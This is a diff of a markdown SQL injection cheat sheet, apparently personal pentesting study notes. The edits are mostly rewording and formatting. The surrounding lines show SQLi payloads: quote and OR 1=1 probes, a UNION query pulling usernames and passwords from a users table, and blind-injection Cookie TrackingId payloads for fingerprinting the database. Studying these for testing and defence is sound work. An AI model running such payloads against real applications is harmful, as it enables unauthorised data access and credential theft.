@@ -7,7 +7,7 @@
 
 ## <mark style="color:yellow;">Overview</mark>
 
-**How to detect SQL injection vulnerabilities**
+**How to detect SQLi vulnerabilities**
 
 * The single quote character `'` and look for errors or other anomalies.
 * Boolean conditions such as `OR 1=1` and `OR 1=2`, and look for differences in the responses.
@@ -99,17 +99,17 @@ SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
 SELECT COLUMN_NAME FROM all_tab_columns WHERE table_name = 'USERS'
 ```
 
-### Retrieving multiple values within a single column
+### <mark style="color:yellow;">Retrieving multiple values within a single column</mark>
 
-You can retrieve multiple values together within this single column by concatenating the values together
+You can retrieve multiple values together within this single column by concatenating the values together.
 
 ```sql
 ' UNION SELECT username || '~' || password FROM users--
 ```
 
-## <mark style="color:yellow;">Blind SQL Injection</mark>
+## <mark style="color:yellow;">Blind SQLi</mark>
 
-Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
+Blind SQLi occurs when an application is vulnerable to SQLi, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
 
 ### <mark style="color:yellow;">Triggering conditional responses</mark>
 
@@ -172,7 +172,7 @@ Cookie: TrackingId=xyz
 Cookie: TrackingId=xyz'
 
 
-# 2 - Identify database [tiberius cheatsheet]. NOTE: add comment...
+# 2 - Identify database [tiberius cheatsheet]. NOTE: add comment at the end...
 ## (MySql). 500 Internal Server Error
 Cookie: TrackingId=xyz' AND 'foo' 'bar' = 'foobar'#
 ## (ORACLE). 200 OK
